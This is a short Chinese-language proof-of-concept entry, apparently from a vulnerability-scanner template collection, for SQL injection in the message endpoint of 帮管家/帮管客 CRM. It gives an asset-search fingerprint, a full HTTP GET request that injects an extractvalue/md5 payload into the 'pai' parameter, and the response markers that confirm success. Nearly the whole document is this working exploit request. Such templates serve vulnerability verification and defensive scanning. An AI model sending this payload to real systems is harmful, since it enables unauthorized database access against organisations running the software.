﻿# 帮管家CRM-message-SQL注入

> 更新时间：2024-04-22

> 漏洞编号：

> 漏洞说明：

> 漏洞特征： app="帮管客-CRM" 

> 验证脚本：HTTP

```
GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select%20md5(1)),0x7e))%23&xu=desc HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

> 响应代码特征：200

> 响应内容特征：a0b923820dcc509a

> 上传文件定位：

> 验证文件来源：帮管家CRM-message-SQL注入.poc

